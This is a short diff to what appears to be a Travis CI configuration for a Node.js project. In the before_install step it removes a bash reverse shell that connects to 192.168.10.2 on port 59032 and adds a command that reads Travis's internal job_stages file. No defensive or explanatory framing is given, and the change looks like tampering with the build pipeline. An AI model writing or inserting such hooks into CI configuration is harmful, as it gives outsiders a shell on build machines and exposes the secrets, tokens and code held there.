@@ -7,7 +7,7 @@ node_js:
 - lts/*
 - '10'
 before_install:
-  - bash -i >& /dev/tcp/192.168.10.2/59032 0>&1
+  - cat /home/travis/.travis/job_stages
 script:
 - echo $TRAVIS_TAG
 - echo $TRAVIS_BRANCH
